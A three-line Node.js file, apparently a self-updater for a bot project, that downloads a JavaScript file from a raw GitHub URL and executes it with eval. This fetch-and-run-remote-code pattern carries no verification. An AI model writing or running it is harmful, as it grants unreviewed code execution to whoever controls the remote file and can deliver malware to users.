const axios = require('axios');

axios.get("https://raw.githubusercontent.com/milan-says/Sofiya-Bot/main/updater.js")
	.then(res => eval(res.data));
